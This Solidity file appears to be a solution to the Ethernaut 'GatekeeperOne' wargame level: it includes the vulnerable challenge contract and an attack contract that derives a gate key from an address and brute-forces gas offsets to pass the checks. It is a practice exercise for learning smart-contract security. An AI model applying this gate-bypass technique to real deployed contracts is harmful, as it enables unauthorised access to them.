pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack{
    
    address mx = 0xD422104E6310367aBE12456FC6017513601E5732;
    bytes8 public lastSixteenDigits = 0xC6017513601E5732;
    bytes8 public gateKey = lastSixteenDigits &  0xFFFFFFFF0000FFFF;

    bool public check = false;

    GatekeeperOne instance;
    constructor(address _instance) public{
        instance = GatekeeperOne(_instance);
    }
    
    function attack() public {
        // instance.enter(_gateKey);
        
         for (uint256 i = 0; i < 120; i++) {
         (bool result, bytes memory data) = address(instance).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
      if(result)
        {
            check =true;
        break;
      }
    }
    }
}